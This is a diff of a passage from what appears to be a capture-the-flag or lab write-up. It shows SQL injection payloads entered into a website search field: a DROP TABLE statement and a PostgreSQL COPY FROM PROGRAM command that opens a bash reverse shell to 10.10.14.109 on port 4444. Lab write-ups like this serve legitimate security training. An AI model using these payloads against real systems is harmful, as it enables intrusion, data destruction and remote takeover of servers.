@@ -145,12 +145,12 @@ Now I will attempt to manually get a reverse shell, this article provides some i
 
 https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5 
 
-I ended up running the following SQL Injection commands directly into the search field of the website to get a reverse shell.
+Using the instructions in the above article, I ended up running the following SQL Injection commands directly into the search field of the website to get a reverse shell.
 
 ```
 '; DROP TABLE IF EXISTS cmd_exec; --
 
-'; CREATE TABLE cmd\_exec(cmd\_output text); --
+'; CREATE TABLE cmd_exec(cmd_output text); --
 
 '; COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.109/4444 0>&1"'; --
 ```
